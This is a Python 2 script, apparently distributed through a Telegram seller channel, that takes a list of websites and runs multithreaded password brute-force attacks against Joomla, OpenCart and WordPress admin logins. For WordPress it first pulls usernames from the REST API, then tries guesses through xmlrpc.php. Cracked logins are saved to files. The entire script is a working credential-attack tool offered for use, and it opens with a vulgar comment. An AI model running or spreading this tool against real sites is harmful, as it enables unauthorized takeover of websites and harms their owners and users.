# -*- coding: utf-8 -*
# !/usr/bin/python
# Coded by X7ROOT
# FUCK A KID !
##############[LIBS]###################
import requests, re, os, sys, codecs, random
from multiprocessing.dummy import Pool
from time import time as timer
import time
from urlparse import urlparse
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from colorama import Fore
from platform import system
from colorama import Style
from colorama import init
warnings.simplefilter('ignore', InsecureRequestWarning)
reload(sys)
sys.setdefaultencoding('utf8')
##########################################################################################
init(autoreset=True)
fr  =   Fore.RED
fh  =   Fore.RED
fc  =   Fore.CYAN
fo  =   Fore.MAGENTA
fw  =   Fore.WHITE
fy  =   Fore.YELLOW
fbl =   Fore.BLUE
fg  =   Fore.GREEN
sd  =   Style.DIM
fb  =   Fore.RESET
sn  =   Style.NORMAL
sb  =   Style.BRIGHT

#####################################
##########################################################################################
try:
    with codecs.open(sys.argv[1], mode='r', encoding='ascii', errors='ignore') as f:
        ooo = f.read().splitlines()
except IndexError:
    print (fr + '[+]================> ' + 'USAGE: ' + sys.argv[0] + ' listsite.txt' + fg)
    pass



##########################################################################################
def urlfix(url):
    if url[-1] == "/":
        pattern = re.compile('(.*)/')
        site = re.findall(pattern, url)
        url = site[0]
    if url[:7] != "http://" and url[:8] != "https://":
        url = "http://" + url
    return url


##########################################################################################

def x1(url):
    try:
        Agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
        passwords = ['demo','demo123','admin123','123456','123456789','123','1234','12345','password123','1234567','12345678','123456789','admin1234','pass1234','admin123456','pass123','root','321321','123123','112233','102030','password','pass','qwerty','abc123','654321']
        admins = ['admin', 'administrator', 'demo']
        ss = requests.session()
        for passwd in passwords:
            for admin in admins:
                passwd = passwd.strip()
                admin = admin.strip()
                target = ss.get(url + '/administrator/index.php', headers=Agent, verify=False, allow_redirects=False, timeout=6)
                pattern = re.compile('type="hidden" name="(.*?)" value="1"')
                findtoken = re.findall(pattern, target.content)
                data = {'username': admin,
                        'passwd': passwd,
                        findtoken[0]: '1',
                        'lang': 'en-GB',
                        'option': 'com_login',
                        'task': 'login',
                        'return': 'aW5kZXgucGhw'}
                post_data = ss.post(url + '/administrator/index.php', data=data, headers=Agent, verify=False, timeout=6)
                if 'New Article' in post_data.content:
                    print '{}{} [JOOMLA-BRUTEFORCE]'.format(fc, sb) + url + '{}{} ~[GOOD LOGIN. #!!!###]'.format(fg, sb)
                    open('Joomla_Bruteforced.txt', 'a').write(url + '/administrator/index.php&' + admin + '&~' + passwd + '#' + '\n')
                    sys.exit()
                else:
                    print '{}{} [JOOMLA-BRUTEFORCE]'.format(fc, sb) + url + '{}{} ~[Bad Credentials #~&&!!]'.format(fr, sb)
                pass
            pass
        pass
    except:
        pass
    pass

def x2(url):
    try:
        site = url + '/admin/index.php'
        headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
        passwords = ['demo','demo123','admin123','123456','123456789','123','1234','12345','password123','1234567','12345678','123456789','admin1234','pass1234','admin123456','pass123','root','321321','123123','112233','102030','password','pass','qwerty','abc123','654321']
        for i in passwords:
            data = {'username': 'admin', 'password': i}
            khabib = requests.post(site, headers=headers, data=data, verify=False, timeout=6)
            if 'common/logout' in khabib.text:
                print '{}{} [OpenCart-BRUTEFORCE] : '.format(fo, sb) + site + '\n' + '{}{} [CRACKED-SUCCESSFULLY] : '.format(fg, sb)
                open('Opencart_Bruteforced.txt', 'a').write(site + '|admin|' + '|' + i + '|' + '\n')
            else:
                print '{}{} [OpenCart-BRUTEFORCE] : '.format(fo, sb) + site + '\n' + '{}{} [BAD PASSWORD] : '.format(fr, sb)

    except:
        pass
    pass

def x3(url):
    try:
        ua = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'}
        ngambil = requests.get(url + '/wp-json/wp/v2/users', headers=ua, verify=False, timeout=10)
        hasil = re.findall('"slug":"(.*?)"', ngambil.text)
        login = hasil[0]
        pas = ['Password', '!@#$%^&*', '12345678', '12345', 'abc123', 'passw0rd', 'iloveyou', 'letmein', 'starwars',
               'whatever', '123456', 'qwerty123', 'admin123', 'admin1234', 'admin12345', 'admin123456', 'admin1234567',
               'Admin123', 'Admin1234', 'Admin12345', 'Admin123456', 'Admin1234567', 'qwerty', 'admin', 'Admin',
               'fuckyou', 'admin@123', 'password123', login, login + '!', login + '@12', login + '@1', login + '@123',
               login + '1', login + '2', login + '3', login + '4', login + '5', login + '6', login + '7', login + '8',
               login + '9', login + '0', login + '10', login + '12', login + '123', login + '1234', login + '12345',
               login + '123456', login + '1234567', login + '12345678', login + '123##@@', login + '123@@##',
               login + '123#@', login + '123@#', login + '12##@@', login + '12@@##', login + '1##@@', login + '1@@##',
               login + '!@#!@#', login + '#@!#@!', login + '!@#', login + '#@!', login + '098', login + '0987',
               login + '09876', login + '098765', login + '0987654', login + '09876543', login + '098765432',
               login + '0987654321', login + '11', login + '10', login + '09', login + '08', login + '07', login + '06',
               login + '05', login + '04', login + '03', login + '02', login + '01', login + '00', login + '153214',
               login + '2017', login + '2016', login + '2015', login + '2014', login + '2018', login + '2019',
               login + '2010', login + '2011', login + '2012', login + '2013', login + '2001', login + '2002',
               login + '2003', login + '2004', login + '2005', login + '2006', login + '2007', login + '2008',
               login + '2009', login + '654321', 'pass', login + 'pass', '654321', '123123', login + '123123', 'admins',
               'password', 'pass123', 'pass1234', 'pass12345', 'pass123456', 'administrator', '000000']
        for passwd in pas:
            fock = requests.post(url + '/xmlrpc.php', timeout=10, headers=ua,
                                 data="<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>" + login + "</value></param><param><value>" + passwd + "</value></param></params></methodCall>")
            if 'blogName' in fock.content:
                print '{}{} [WordPress-BRUTEFORCE] : '.format(fy, sb) + url + '\n' + '{}{} [CRACKED-SUCCESSFULLY] : '.format(fg, sb)
                with open('WordPress_Bruteforced.txt', 'a') as o:
                    o.writelines(url + '/wp-login.php' + '#' + login + '@' + passwd + '\n')
                break
            else:
                print '{}{} [WordPress-BRUTEFORCE] : '.format(fo, sb) + url + '\n' + '{}{} ~[Bad Credentials #~&&!!] : '.format(fo, sb)
            pass
        pass
    except:
        pass
    pass


##########################################################################################
def check(url):
    try:
        url = urlfix(url)
        Agent = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
        se = requests.session()
        ktn1 = se.get(url+'/administrator/', headers=Agent, verify=False, timeout=30)
        ktn2 = se.get(url+'/admin/index.php', headers=Agent, verify=False, timeout=30)
        ktn3 = se.get(url+'/wp-login.php', headers=Agent, verify=False, timeout=30)
        if 'Joomla' in ktn1.text:
            x1(url)
            open('Joomla.txt', 'a').write(url + '\n')
            pass
        elif 'common/login' in ktn2.content:
            x2(url)
            open('Opencart.txt', 'a').write(url + '\n')
            pass
        elif 'WordPress' in ktn3.content:
            x3(url)
            open('WordPress.txt', 'a').write(url + '\n')
            pass
        else:
            pass
        pass
    except:
        pass
    pass


##########################################################################################
def logo():
    clear = "\x1b[0m"
    colors = [36, 32, 34, 35, 31, 37]
    x = '''
                  .------------
                 /             /
                |              |
                |,  .-.  .-.  ,|
                | )(@_/  \@_)( |
                |/     /\     \|
      (@_       (_     ^^     _)
 _     ) \_______\__|IIIIII|__/_________________________
(_)@8@8>>________|-\IIIIII/-|___________________________>
       )_/        \          /
      (@           `--------`
                    x7root
       Toolie : Bruteforce Joomla + WordPress + Opencart
             Toolie : https://t.me/x7seller
        ]-------------------------------------[
'''
    for N, line in enumerate(x.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.05)
        pass


logo()


##########################################################################################
def Main():
    try:

        start = timer()
        ThreadPool = Pool(50)
        Threads = ThreadPool.map(check, ooo)
        print('TIME TAKE: ' + str(timer() - start) + ' S')
    except:
        pass


if __name__ == '__main__':
    Main()